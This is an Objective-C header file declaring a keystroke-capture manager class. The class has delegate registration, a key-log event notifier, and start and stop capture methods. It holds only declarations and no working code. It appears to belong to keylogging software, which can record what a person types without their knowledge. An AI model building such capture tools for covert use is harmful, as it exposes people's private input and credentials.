//
//  KeyLogCaptureManager.h
//  KeyLogCaptureManager
//
//  Created by Ophat Phuetkasickonphasutha on 9/4/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//


#import <Foundation/Foundation.h>

#import "EventCapture.h"

@class KeyLogEventNotifier;

@interface KeyLogCaptureManager : NSObject <EventCapture> {
	id <EventDelegate>		mEventDelegate;
	KeyLogEventNotifier * mKeyLogEventNotifier;
}

@property (nonatomic, assign) id <EventDelegate> mEventDelegate;
@property (nonatomic, assign) KeyLogEventNotifier * mKeyLogEventNotifier;

- (void) registerEventDelegate: (id <EventDelegate>) aEventDelegate; // register is keyword in Objective-C
- (void) unregisterEventDelegate;
- (void) startCapture;
- (void) stopCapture;

- (id) initWithEventDelegate: (id <EventDelegate>) aEventDelegate;

@end


